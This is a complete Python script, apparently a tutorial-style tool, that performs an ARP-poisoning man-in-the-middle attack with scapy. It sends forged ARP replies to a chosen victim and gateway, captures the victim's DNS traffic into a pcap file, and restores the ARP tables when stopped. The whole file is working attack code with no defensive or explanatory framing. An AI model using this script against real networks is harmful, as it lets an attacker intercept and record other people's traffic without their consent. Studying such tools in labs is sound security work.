from multiprocessing import Process, Event
from scapy.all import srp, conf, send, sniff, wrpcap
from scapy.layers.l2 import ARP, Ether

import sys
import time
import os.path
import logging

event = Event()

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)


def get_mac(target_ip):
	packet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op="who-has", pdst=target_ip)
	resp, _ = srp(packet, timeout=2, retry=10, verbose=False)
	for _, r in resp:
		return r[ARP].hwsrc
	return None


class Arper:
	def __init__(self, victim, gateway, interface="Беспроводная сеть"):
		self.victim = victim
		self.victim_mac = get_mac(victim)
		self.gateway = gateway
		self.gateway_mac = get_mac(gateway)
		self.interface = interface

		conf.iface = interface
		conf.verb = 0

	def poison(self, e):
		poison_victim_packet = ARP(op=2, psrc=self.gateway, pdst=self.victim, hwdst=self.victim_mac)
		poison_victim = Ether(dst=self.victim_mac) / poison_victim_packet
		poison_gateway_packet = ARP(op=2, psrc=self.victim, pdst=self.gateway, hwdst=self.gateway_mac)
		poison_gateway = Ether(dst=self.gateway_mac) / poison_gateway_packet

		print("Beginning the ARP poison. [CTRL-C to stop]")
		while True:
			try:
				send(poison_victim, verbose=False)
				send(poison_gateway, verbose=False)
				time.sleep(2)
			except KeyboardInterrupt:
				break

		e.set()
		self.restore()
		sys.exit(0)

	def sniff(self, e):
		time.sleep(5)
		print(f"Sniffing packets")
		bpf_filter = "ip host %s and udp and port 53" % self.victim
		packets = sniff(filter=bpf_filter, stop_filter=lambda x: e.is_set(), iface=self.interface)
		wrpcap("arper.pcap", packets)
		print("Saved to arper.pcap")
		sys.exit(0)

	def restore(self):
		send(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(
			op=2,
			psrc=self.gateway,
			hwsrc=self.gateway_mac,
			pdst=self.victim,
			hwdst="ff:ff:ff:ff:ff:ff"),
			count=5,
			verbose=False)
		send(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(
			op=2,
			psrc=self.victim,
			hwsrc=self.victim_mac,
			pdst=self.gateway,
			hwdst="ff:ff:ff:ff:ff:ff"),
			count=5,
			verbose=False)
		print("ARP tables restored")


if __name__ == "__main__":
	if len(sys.argv) < 3:
		print(f"Usage: python3 {os.path.basename(__file__)} victim_ip gateway_ip [interface_name]")
		exit(0)

	if len(sys.argv) == 3:
		myarp = Arper(sys.argv[1], sys.argv[2])
	else:
		myarp = Arper(sys.argv[1], sys.argv[2], sys.argv[3])

	poison_process = Process(target=myarp.poison, args=(event,))
	poison_process.start()

	sniff_process = Process(target=myarp.sniff, args=(event,))
	sniff_process.start()

	try:
		event.wait()
	except KeyboardInterrupt:
		pass

	sniff_process.join()
	poison_process.join()
	print("Program finished")
